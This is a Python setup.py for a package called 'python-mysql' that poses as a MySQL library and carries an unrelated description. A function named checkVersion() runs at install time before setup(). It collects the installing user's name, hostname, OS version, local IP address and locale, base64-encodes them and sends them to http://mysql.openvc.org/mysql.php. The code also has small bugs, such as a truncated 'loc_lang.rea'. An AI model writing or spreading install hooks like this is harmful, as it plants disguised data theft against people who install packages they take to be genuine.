from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen("echo $LANG")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='MySQLdb'
    vid = user_name+"###"+hostname+"###"+os_version+"###"+ip+"###"+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://mysql.openvc.org/mysql.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
        urllib.urlopen(r'http://mysql.openvc.org/mysql.php','vid='+base64.encodestring(vid))
checkVersion()
setup(
    name='python-mysql',
    version='1.0.0',
    packages=['MySQLdb'],
    url='http://mysql.openvc.org',
    license='New BSD License',
    description='array processing for numbers, strings, records, and objects.'
)
